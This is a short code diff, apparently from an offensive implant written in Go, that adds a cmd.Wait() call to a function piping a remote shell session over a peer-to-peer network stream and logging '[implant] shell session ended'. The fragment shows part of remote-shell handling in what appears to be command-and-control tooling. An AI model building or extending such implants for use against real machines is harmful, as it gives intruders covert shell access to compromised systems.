@@ -40,5 +40,6 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	go io.Copy(f, s)
 	io.Copy(s, f)
 
+	cmd.Wait()
 	log.Printf("[implant] shell session ended for %s", remotePeer.String())
 }
